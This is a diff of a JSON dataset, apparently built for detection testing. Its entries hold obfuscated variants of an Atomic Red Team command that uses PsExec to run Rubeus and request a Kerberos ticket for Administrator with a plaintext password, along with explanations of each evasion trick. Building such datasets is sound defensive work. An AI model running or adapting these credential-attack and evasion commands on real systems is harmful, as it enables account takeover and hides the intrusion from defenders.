@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe\" --accepteula \\\\localhost -w c:\\ -c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\rubeus.exe asktgt /user:Administrator /password:Password /domain:THAIMX /outfile:ticket.kirbi",
@@ -33,4 +32,6 @@
     "explanation": "Substituted '-accepteula' with '--accepteula' using long option substitution."
   },
   {
-    "output": "\"powershell.exe\" & {& \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\" --accepteula \\\\localhost -w c:\\ -c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\rubeus.exe
+    "output": "\"powershell.exe\" & {& \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\" --accepteula \\\\localhost -w c:\\ -c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\rubeus.exe"
+  }
+]
